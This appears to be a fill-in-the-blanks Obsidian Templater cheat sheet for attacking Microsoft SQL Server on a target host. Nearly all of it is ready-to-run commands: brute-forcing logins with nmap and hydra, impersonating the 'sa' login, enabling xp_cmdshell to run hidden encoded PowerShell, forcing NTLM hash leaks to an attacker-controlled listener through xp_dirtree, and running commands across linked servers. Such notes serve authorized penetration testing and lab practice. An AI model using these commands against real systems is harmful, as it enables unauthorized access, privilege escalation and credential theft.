# MSSQL — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let domain = tp.frontmatter.domain; let user = tp.frontmatter.username || '<user>'; let pass = tp.frontmatter.password || '<pass>' -%>

---

## Nmap
```bash
nmap -p<% tp.frontmatter.current_port %> --script=ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config <% ip %>
```

```bash
nmap -p<% tp.frontmatter.current_port %> --script=ms-sql-brute <% ip %>
```

---

## Discovery
```bash
# NetExec — find MSSQL instances
nxc mssql <% ip %>
```

```bash
# Impacket — connect with Windows auth
impacket-mssqlclient <% user %>@<% ip %> -windows-auth
```

```bash
# Impacket — connect with SQL auth
impacket-mssqlclient <% user %>:'<% pass %>'@<% ip %>
```

```bash
# Impacket — domain auth
impacket-mssqlclient <% domain %>/<% user %>:'<% pass %>'@<% ip %> -windows-auth
```

---

## Enumeration (run inside MSSQL)
```sql
-- Server version / info
SELECT @@version

-- Current user
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT IS_SRVROLEMEMBER('sysadmin')

-- List all databases
SELECT name FROM master.sys.databases
-- OR
EXEC sp_databases

-- Current permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER')

-- Switch database
USE <dbname>

-- List tables in current DB
SELECT name FROM sysobjects WHERE xtype = 'U'
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'

-- Query a table
SELECT TOP 10 * FROM <table>
```

---

## Privilege Check
```sql
-- Check sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Check all server roles
SELECT r.name, m.name AS member FROM sys.server_role_members rm
JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id

-- Find impersonatable logins
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

---

## Impersonation Attack
```sql
-- Impersonate a more privileged login
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

---

## Command Execution (xp_cmdshell)
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS command
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user'
EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64>'
```

```bash
# Via NetExec
nxc mssql <% ip %> -u '<% user %>' -p '<% pass %>' -d '<% domain %>' --local-auth -x 'whoami'
```

---

## NTLM Hash Capture (force outbound auth)
```bash
# Start listener
sudo responder -I tun0 -wd
# OR
sudo impacket-smbserver share ./ -smb2support
```

```sql
-- Trigger outbound connection from SQL server
EXEC xp_dirtree '\\<% tp.frontmatter.my_ip %>\pwn'
EXEC master.dbo.xp_dirtree '\\<% tp.frontmatter.my_ip %>\pwn'
EXEC master..xp_subdirs '\\<% tp.frontmatter.my_ip %>\pwn'
EXEC master..xp_fileexist '\\<% tp.frontmatter.my_ip %>\pwn'
```

---

## Linked Servers
```sql
-- Find linked servers
EXEC sp_linkedservers
SELECT * FROM sys.servers

-- Query through linked server
SELECT * FROM OPENQUERY(<linked_server>, 'SELECT @@version')

-- Execute command on linked server (if xp_cmdshell enabled there)
EXEC ('xp_cmdshell ''whoami''') AT [<linked_server>]

-- Enable xp_cmdshell on linked server
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE') AT [<linked_server>]
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [<linked_server>]
```

---

## File Read / Write
```sql
-- Read file (SQL Server 2005+)
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x

-- Write file (if INTO FILE works)
EXEC xp_cmdshell 'echo hack > C:\Windows\Temp\test.txt'
```

---

## PowerUpSQL (Windows — full enumeration)
```powershell
Import-Module PowerUpSQL.ps1

# Discover instances on network
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft -AutoSize

# Audit current server
Invoke-SQLAudit -Verbose -Instance <% ip %>

# Get server info
Get-SQLServerInfo -Instance <% ip %>

# Find linked servers recursively
Get-SQLServerLinkCrawl -Instance <% ip %> -Verbose
```

---

## Brute Force
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt mssql://<% ip %>
```

```bash
nxc mssql <% ip %> -u users.txt -p passwords.txt
```

---

## Notes
